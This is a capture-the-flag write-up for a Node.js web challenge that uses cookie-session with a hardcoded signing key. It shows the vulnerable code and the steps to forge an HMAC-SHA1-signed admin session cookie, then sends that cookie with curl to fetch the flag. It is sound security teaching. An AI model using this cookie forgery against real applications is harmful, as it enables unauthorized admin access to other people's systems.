# CTF WriteUp: theme-generator Challenge

## Challenge Overview

- **Name**: theme-generator
- **Points**: 100
- **Category**: Web Security
- **Target**: `http://[CTF-SERVER]:[PORT]` (anonymized)

## Initial Reconnaissance

First, let's explore the application structure:

```bash
curl -s http://[CTF-SERVER]:[PORT]
```

The application appears to be a Node.js web application with user authentication functionality.

## Key Findings

### 1. Application Structure Analysis

After examining the application, several key components were identified:

- **Authentication System**: Uses session-based authentication
- **Cookie Management**: Implements `cookie-session` middleware
- **Admin Panel**: Protected route at `/admin/flag`
- **Database**: Contains user information including admin credentials

### 2. Session Management Vulnerability

The critical vulnerability lies in the session management implementation:

#### Cookie-Session Configuration

The application uses `cookie-session` with a **hardcoded secret key**:

```javascript
// Vulnerable configuration
app.use(
  cookieSession({
    name: "sess",
    keys: ["not-a-secret"], // ⚠️ Hardcoded secret
    maxAge: 24 * 60 * 60 * 1000,
  })
);
```

#### Authentication Middleware

```javascript
const authMiddleware = (req, res, next) => {
  if (req.session.username) {
    // Retrieves user from database based on session username
    const user = getUserFromDB(req.session.username);
    req.user = user;
  }
  next();
};
```

#### Admin Check

```javascript
const requireAdmin = (req, res, next) => {
  if (req.user && req.user.isAdmin) {
    next();
  } else {
    res.status(403).send("admins only");
  }
};
```

## Vulnerability Analysis

### Cookie Forgery Attack

The vulnerability allows us to forge a valid admin session cookie because:

1. **Known Secret Key**: The HMAC signing key is hardcoded as `"not-a-secret"`
2. **Predictable Structure**: Session data is JSON: `{"username":"admin"}`
3. **Admin User Exists**: Database contains an admin user with `isAdmin: true`

### Technical Details

The cookie structure uses two components:

- `sess`: Base64-encoded JSON session data
- `sess.sig`: HMAC-SHA1 signature in base64url format

## Exploitation Process

### Step 1: Craft the Session Data

Create the admin session JSON:

```json
{ "username": "admin" }
```

Base64 encode this data:

```bash
echo -n '{"username":"admin"}' | base64
# Result: [BASE64_ENCODED_VALUE]
```

### Step 2: Generate Valid Signature

The signature is computed as:

```
HMAC-SHA1(key="not-a-secret", message="sess=[BASE64_SESSION_DATA]")
```

This produces the base64url-encoded signature: `[CALCULATED_SIGNATURE]`

### Step 3: Execute the Attack

Use the forged cookies to access the admin flag:

```bash
curl -s -i \
  -H 'Cookie: sess=[BASE64_SESSION_DATA]; sess.sig=[HMAC_SIGNATURE]' \
  http://[CTF-SERVER]:[PORT]/admin/flag
```

## Attack Flow Diagram

```
1. Client Request with Forged Cookies
   ↓
2. cookie-session verifies signature with known secret
   ↓
3. authMiddleware reads session.username = "admin"
   ↓
4. Database lookup returns admin user with isAdmin: true
   ↓
5. requireAdmin middleware allows access
   ↓
6. Flag endpoint returns the flag
```
